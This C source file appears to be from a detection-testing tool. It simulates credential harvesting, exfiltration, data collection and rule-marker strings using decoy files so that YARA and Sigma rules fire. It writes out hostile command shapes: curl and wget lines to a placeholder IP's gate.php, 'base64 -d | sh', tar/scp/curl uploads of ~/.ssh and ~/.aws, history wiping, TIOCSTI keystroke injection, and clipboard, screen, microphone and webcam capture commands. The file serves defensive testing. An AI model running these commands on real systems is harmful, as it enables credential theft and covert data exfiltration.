// SPDX-License-Identifier: GPL-3.0-only
// Copyright (c) 2026 MikiMiku (MoreMorePwn)
//
// credential-access.c — credential-shaped reads, exfiltration, collection and
// detection-rule markers.
//
// cred-read never touches a real secret: the files it opens and reads are
// decoys written into the work directory. The standard credential locations
// are only access()ed and stat()ed, and the result says present or absent, so
// the syscall view gets the shape without the host's secrets leaving the guest.
// A decoy is placed at a lookalike path: the rules that key on a file name
// (.bash_history, wallet.dat, *.keytab, the service-account token path) fire
// in the work directory; the ones that need a path below a real home
// directory (~/.aws, ~/.ssh, browser profiles) fire with --cred-home.
//
// rule-markers carries the strings YARA and Sigma rules key on, writes them to a
// file for file scans, and runs a few benign discovery commands so Sigma has
// process_creation events to match.
#include "samples.h"

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

static uint32_t fnv1a(const unsigned char *data, size_t length)
{
    uint32_t hash = 2166136261u;
    for (size_t i = 0; i < length; i++) {
        hash ^= data[i];
        hash *= 16777619u;
    }
    return hash;
}

static ssize_t read_file(const char *path, unsigned char *buffer, size_t cap)
{
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0)
        return -1;
    ssize_t got = read(fd, buffer, cap);
    close(fd);
    return got;
}

// Like sample_write_nested but refuses to replace an existing file. *created is 0
// when the file was already there, so the caller can leave it alone.
static int write_nested_exclusive(const char *path, const char *text, int *created)
{
    char copy[512];
    int length = snprintf(copy, sizeof copy, "%s", path);
    if (length <= 0 || (size_t)length >= sizeof copy)
        return -1;
    char *slash = strrchr(copy, '/');
    if (!slash)
        return -1;
    *slash = 0;
    if (sample_mkdir_p(copy) != 0)
        return -1;
    int fd = open(path, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0600);
    if (fd < 0) {
        if (errno == EEXIST) {
            *created = 0;
            return 0;
        }
        return -1;
    }
    *created = 1;
    int result = sample_write_all(fd, text, strlen(text));
    if (close(fd) != 0)
        result = -1;
    if (result != 0)
        unlink(path);
    return result;
}

// Removes directories above path until stop, but only while they are empty.
// Existing directories with real content stop the walk, so nothing is lost.
static void remove_empty_parents(const char *path, const char *stop)
{
    char copy[512];
    int length = snprintf(copy, sizeof copy, "%s", path);
    if (length <= 0 || (size_t)length >= sizeof copy)
        return;
    char *slash = strrchr(copy, '/');
    if (!slash)
        return;
    *slash = 0;
    size_t stop_length = strlen(stop);
    while (strlen(copy) > stop_length && strncmp(copy, stop, stop_length) == 0 &&
           copy[stop_length] == '/') {
        if (rmdir(copy) != 0)
            break;
        slash = strrchr(copy, '/');
        if (!slash)
            break;
        *slash = 0;
    }
}

// Contents are obvious decoys: the AWS pair is the public documentation
// example and every other value contains ANTINOMIE-DEMO. `in_home` marks the
// ones --cred-home may place below $HOME; the others only ever go in the work directory.
static const struct {
    const char *relative;
    const char *text;
    int in_home;
} decoys[] = {
    {".aws/credentials",
     "[default]\n"
     "aws_access_key_id = AKIAIOSFODNN7EXAMPLE\n"
     "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n",
     1},
    {".ssh/id_rsa",
     "-----BEGIN OPENSSH PRIVATE KEY-----\n"
     "ANTINOMIE-DEMO-0000000000000000000000000000000000000000000000000000\n"
     "-----END OPENSSH PRIVATE KEY-----\n",
     1},
    {".git-credentials", "https://demo:ghp_ANTINOMIEDEMO0000000000000000000000@github.com\n", 1},
    {".config/google-chrome/Default/Login Data",
     "SQLite format 3\n"
     "ANTINOMIE-DEMO-COOKIE-DB\n"
     "https://example.invalid\0demo\0hunter2-demo\n",
     1},
    {".mozilla/firefox/demo.default/logins.json",
     "{\"logins\":[{\"hostname\":\"https://example.invalid\",\"username\":\"demo\","
     "\"password\":\"ANTINOMIE-DEMO\"}]}\n",
     1},
    {".bash_history",
     "curl -s -X POST http://198.51.100.23/gate.php -d @/tmp/loot\n"
     "crontab -l\n"
     "history -c\n",
     1},
    {".zsh_history", ": 1700000000:0;ssh admin@198.51.100.23\n", 0},
    {".kube/config", "apiVersion: v1\nclusters: []\n# ANTINOMIE-DEMO\n", 1},
    {".netrc", "machine example.invalid login demo password ANTINOMIE-DEMO\n", 1},
    {".config/gcloud/credentials.db", "SQLite format 3\nANTINOMIE-DEMO-GCLOUD\n", 1},
    {".bitcoin/wallet.dat", "ANTINOMIE-DEMO wallet placeholder, not a wallet\n", 1},
    {".electrum/wallets/default_wallet", "{\"ANTINOMIE-DEMO\":true}\n", 1},
    {"krb5.keytab", "ANTINOMIE-DEMO keytab placeholder\n", 0},
    {"var/run/secrets/kubernetes.io/serviceaccount/token", "ANTINOMIE-DEMO.service.account.token\n", 0},
    {".ssh/known_hosts", "10.0.2.2 ssh-ed25519 AAAAANTINOMIEDEMO\n", 0},
};
#define DECOY_COUNT (sizeof decoys / sizeof decoys[0])

SCENARIO(cred_read)
{
    const char *name = "cred-read";
    const char *home = getenv("HOME");
    int use_home = options->cred_home;
    if (use_home && (!home || !*home)) {
        sample_fail(name, "--cred-home needs HOME to be set");
        return 1;
    }

    // Probe the standard locations first, before any decoy is written, so
    // "present" reflects the guest's real state. Contents are never read.
    static const char *real_paths[] = {".aws/credentials",         ".ssh/id_rsa",
                                       ".git-credentials",         ".bash_history",
                                       ".config/google-chrome/Default/Login Data",
                                       ".mozilla/firefox",         ".bitcoin/wallet.dat"};
    int present = 0;
    if (home && *home) {
        for (size_t i = 0; i < sizeof real_paths / sizeof real_paths[0]; i++) {
            char path[600];
            snprintf(path, sizeof path, "%s/%s", home, real_paths[i]);
            struct stat info;
            if (stat(path, &info) == 0) {
                present++;
                sample_note(name, "real %s present (%lld bytes, not read)", real_paths[i],
                         (long long)info.st_size);
            }
        }
    }
    struct stat shadow;
    if (stat("/etc/shadow", &shadow) == 0)
        sample_note(name, "real /etc/shadow present (%lld bytes, not read)",
                 (long long)shadow.st_size);

    char base[512];
    if (use_home)
        snprintf(base, sizeof base, "%s", home);
    else if (sample_path(base, sizeof base, options->workdir, "cred-home") != 0) {
        sample_fail(name, "work directory path too long");
        return 1;
    }

    char created_paths[DECOY_COUNT][600];
    size_t created_count = 0;
    size_t total = 0;
    uint32_t hash = 2166136261u;
    int read_ok = 0, planned = 0;
    for (size_t i = 0; i < DECOY_COUNT; i++) {
        if (use_home && !decoys[i].in_home)
            continue;
        planned++;
        char path[600];
        snprintf(path, sizeof path, "%s/%s", base, decoys[i].relative);
        int created = 1;
        int written = use_home ? write_nested_exclusive(path, decoys[i].text, &created)
                               : sample_write_nested(path, decoys[i].text);
        if (written != 0) {
            sample_note(name, "could not write decoy %s: %s", decoys[i].relative, strerror(errno));
            continue;
        }
        if (!created) {
            sample_note(name, "%s already exists; left untouched", decoys[i].relative);
            continue;
        }
        if (use_home && created_count < DECOY_COUNT)
            snprintf(created_paths[created_count++], sizeof created_paths[0], "%s", path);
        unsigned char buffer[4096];
        ssize_t got = read_file(path, buffer, sizeof buffer);
        if (got < 0) {
            sample_note(name, "could not read back %s: %s", decoys[i].relative, strerror(errno));
            continue;
        }
        total += (size_t)got;
        uint32_t file_hash = fnv1a(buffer, (size_t)got);
        hash ^= file_hash;
        hash *= 16777619u;
        read_ok++;
        sample_note(name, "read %s (%zd bytes, %08x)", decoys[i].relative, got, file_hash);
    }

    char body[256];
    snprintf(body, sizeof body, "stage=creds&files=%d&bytes=%zu&hash=%08x&scenario=cred-read",
             read_ok, total, hash);
    unsigned long long received = 0;
    const char *host = sample_host(options);
    int port = sample_port(options, SAMPLE_HTTP_PORT);
    int delivered = sample_http_request(host, port, "POST", "/gate.php", body, strlen(body),
                                     &received) == 0;
    if (!delivered)
        sample_note(name, "%s:%d unreachable: %s", host, port, strerror(errno));
    sample_pass(name, "%d/%d decoy credential files read from %s, %zu bytes, exfil POST %s to %s:%d",
             read_ok, planned, use_home ? "$HOME" : base, total, delivered ? "sent" : "attempted",
             host, port);
    sample_note(name, "%d/%zu standard credential paths present; only stat'ed, never read", present,
             sizeof real_paths / sizeof real_paths[0]);
    if (!use_home)
        sample_note(name, "decoys are in the work directory: rules that need a path below a real "
                       "home (~/.aws, ~/.ssh, browser stores) need --cred-home");
    if (use_home) {
        // Always remove what this run created, even with --keep: --keep is for
        // the work directory, not for planting files in a real home.
        for (size_t i = 0; i < created_count; i++)
            unlink(created_paths[i]);
        for (size_t i = 0; i < created_count; i++)
            remove_empty_parents(created_paths[i], home);
        sample_note(name, "removed %zu decoy files from $HOME", created_count);
    }
    return 0;
}

// ---- exfil-sim ----------------------------------------------------------------------

SCENARIO(exfil_sim)
{
    const char *name = "exfil-sim";
    const char *host = sample_host(options);
    int port = sample_port(options, SAMPLE_HTTP_PORT);
    char directory[600], decoy[700];
    int sent = -1;
    // A decoy key in a credentials-class path, sent with sendfile(2) straight to a socket.
    if (sample_path(directory, sizeof directory, options->workdir, ".ssh") == 0 &&
        sample_mkdir_p(directory) == 0 && sample_path(decoy, sizeof decoy, directory, "id_exfil") == 0 &&
        sample_write_text(decoy, "ANTINOMIE-DEMO decoy key material for the exfiltration shape\n") == 0) {
        int file = open(decoy, O_RDONLY | O_CLOEXEC);
        struct stat info;
        if (file >= 0 && fstat(file, &info) == 0) {
            int sock = sample_dial(host, port, 1500);
            if (sock < 0) {
                sample_note(name, "%s:%d unreachable: %s", host, port, strerror(errno));
            } else {
                char header[256];
                int length = snprintf(header, sizeof header,
                                      "PUT /upload/id_exfil HTTP/1.1\r\nHost: %s\r\n"
                                      "User-Agent: %s\r\nContent-Length: %lld\r\n"
                                      "Connection: close\r\n\r\n",
                                      host, SAMPLE_USER_AGENT, (long long)info.st_size);
                off_t offset = 0;
                if (length > 0 && sample_send_all(sock, header, (size_t)length) == 0)
                    sent = (int)sendfile(sock, file, &offset, (size_t)info.st_size);
                char reply[256];
                sample_recv_wait(sock, reply, sizeof reply, 400);
                close(sock);
            }
        }
        if (file >= 0)
            close(file);
    }

    char stage[600], archive[700], archive_zip[700], target[96], upload[160];
    sample_path(stage, sizeof stage, options->workdir, ".stage");
    sample_mkdir_p(stage);
    sample_path(archive, sizeof archive, stage, "loot.tgz");
    sample_path(archive_zip, sizeof archive_zip, stage, "loot.zip");
    snprintf(target, sizeof target, "analyst@%s:/tmp/loot", host);
    snprintf(upload, sizeof upload, "http://%s:%d/upload", host, port);
    char *const tar[] = {"tar", "czf", archive, "/root/.ssh", "/home/analyst/.aws", NULL};
    char *const zip[] = {"zip", "-r", archive_zip, "/home/analyst/.config", NULL};
    char *const scp[] = {"scp", archive, target, NULL};
    char *const curl[] = {"curl", "-T", archive, upload, NULL};
    char *const rsync[] = {"rsync", "-a", stage, target, NULL};
    char *const *const stand_ins[] = {tar, zip, scp, curl, rsync};
    int ran = 0;
    for (size_t i = 0; i < sizeof stand_ins / sizeof stand_ins[0]; i++)
        ran += sample_spoof(stand_ins[i], NULL) == 0;
    sample_pass(name, "sendfile of a decoy key to %s:%d (%d bytes sent), %d/%zu archive and copy "
                   "stand-ins (tar, zip, scp, curl -T, rsync)",
             host, port, sent < 0 ? 0 : sent, ran, sizeof stand_ins / sizeof stand_ins[0]);
    sample_note(name, "tar, zip, scp, curl and rsync are not run; their argument vectors are the shape");
    return 0;
}

// ---- collection-sim -----------------------------------------------------------------

#define SWEEP_FILES 54

SCENARIO(collection_sim)
{
    const char *name = "collection-sim";
    int steps = 0, done = 0;
    char directory[600], path[700];

    static const struct spoof tools[] = {
        {"collection.clipboard", {"xclip", "-o", "-selection", "clipboard", NULL}},
        {"collection.clipboard", {"wl-paste", NULL}},
        {"collection.screen_capture", {"scrot", "screen.png", NULL}},
        {"collection.screen_capture", {"ffmpeg", "-f", "x11grab", "-i", ":0", "x.mp4", NULL}},
        {"collection.av_capture", {"arecord", "-d", "1", "mic.wav", NULL}},
        {"collection.av_capture", {"fswebcam", "cam.jpg", NULL}},
    };
    done += sample_spoof_all(name, tools, sizeof tools / sizeof tools[0]);
    steps += (int)(sizeof tools / sizeof tools[0]);

    // TIOCSTI pushes keystrokes into a terminal; on a regular file it is ENOTTY.
    if (sample_path(directory, sizeof directory, options->workdir, "docs") == 0 &&
        sample_mkdir_p(directory) == 0 && sample_path(path, sizeof path, directory, "inject.txt") == 0 &&
        sample_write_text(path, "ANTINOMIE-DEMO\n") == 0) {
        int fd = open(path, O_RDONLY | O_CLOEXEC);
        if (fd >= 0) {
            char key = 'x';
            steps++;
            done += ioctl(fd, 0x5412 /* TIOCSTI */, &key) == -1 ? 1 : 0;
            close(fd);
        }
    }

    // A sweep over documents: the rule counts files below a home directory,
    // so this only fires when the work directory is below /home or /root.
    int swept = 0;
    for (int i = 0; i < SWEEP_FILES; i++) {
        char leaf[48];
        snprintf(leaf, sizeof leaf, "report%02d.txt", i);
        unsigned char buffer[64];
        if (sample_path(path, sizeof path, directory, leaf) == 0 &&
            sample_write_text(path, "ANTINOMIE-DEMO document\n") == 0 &&
            read_file(path, buffer, sizeof buffer) > 0)
            swept++;
    }
    int below_home = !strncmp(options->workdir, "/home/", 6) || !strncmp(options->workdir, "/root/", 6);
    sample_pass(name, "%d/%d collection steps; %d documents written and read back for the sweep", done,
             steps, swept);
    if (!below_home)
        sample_note(name, "work directory %s is not below /home or /root: collection.local_sweep "
                       "will not fire (use --workdir /home/analyst/x)", options->workdir);
    return 0;
}

// ---- rule-markers ----------------------------------------------------------------------

static const char *markers[] = {
    "ANTINOMIE_BEHAVIOR_SAMPLE_v2",
    "ANTINOMIE_CRED_DECOY",
    "T1059.004",  "T1105",     "T1055",     "T1071.001", "T1048.003",
    "T1552.001",  "T1053.003", "T1547.001", "T1620",     "T1014",
    "attack.execution", "attack.persistence", "attack.defense-evasion",
    "attack.credential-access", "attack.command-and-control", "attack.exfiltration",
    "attack.discovery", "attack.privilege-escalation",
    "curl -s -X POST http://198.51.100.23/gate.php -d @/tmp/loot",
    "wget -qO- http://198.51.100.23/download.bin",
    "base64 -d | sh",
    "chmod 777 /tmp/.x",
    "LD_PRELOAD=/tmp/libx.so",
    "memfd_create",
    "ptrace(PTRACE_TRACEME)",
    "/dev/shm/.cache",
    "crontab -l",
    "systemctl --user enable antinomie-demo",
    "history -c",
    "rm -rf ~/.bash_history",
};

static int run_command(const char *program, char *const argv[])
{
    fflush(stdout);
    pid_t child = fork();
    if (child == 0) {
        int null = open("/dev/null", O_RDWR | O_CLOEXEC);
        if (null >= 0) {
            dup2(null, 1);
            dup2(null, 2);
        }
        execvp(program, argv);
        _exit(127);
    }
    if (child < 0)
        return -1;
    int status = 0;
    if (waitpid(child, &status, 0) != child)
        return -1;
    return WIFEXITED(status) ? WEXITSTATUS(status) : -1;
}

SCENARIO(rule_markers)
{
    const char *name = "rule-markers";
    size_t count = sizeof markers / sizeof markers[0];
    char text[4096];
    size_t at = 0;
    for (size_t i = 0; i < count && at + 64 < sizeof text; i++) {
        int written = snprintf(text + at, sizeof text - at, "%s\n", markers[i]);
        if (written < 0)
            break;
        at += (size_t)written;
        if (i < 4)
            sample_note(name, "marker %s", markers[i]);
    }
    char path[600];
    int written = sample_path(path, sizeof path, options->workdir, "rule-markers.txt") == 0 &&
                  sample_write_text(path, text) == 0;

    // Benign discovery commands: Sigma's Linux rules match process_creation
    // events for these argument vectors. Each runs without a shell and with
    // its output discarded.
    static const struct {
        const char *program;
        char *const argv[4];
    } commands[] = {
        {"uname", {(char *)"uname", (char *)"-a", NULL}},
        {"id", {(char *)"id", NULL}},
        {"crontab", {(char *)"crontab", (char *)"-l", NULL}},
        {"cat", {(char *)"cat", (char *)"/etc/os-release", NULL}},
    };
    int ran = 0;
    for (size_t i = 0; i < sizeof commands / sizeof commands[0]; i++) {
        int status = run_command(commands[i].program, commands[i].argv);
        if (status >= 0 && status != 127)
            ran++;
        else
            sample_note(name, "%s is not available in this guest", commands[i].program);
    }
    sample_pass(name, "%zu markers in %s (%s), %d/%zu discovery commands executed", count, path,
             written ? "written" : "not written", ran, sizeof commands / sizeof commands[0]);
    sample_note(name, "markers name MITRE techniques and Sigma tags for rule and static scans");
    return 0;
}
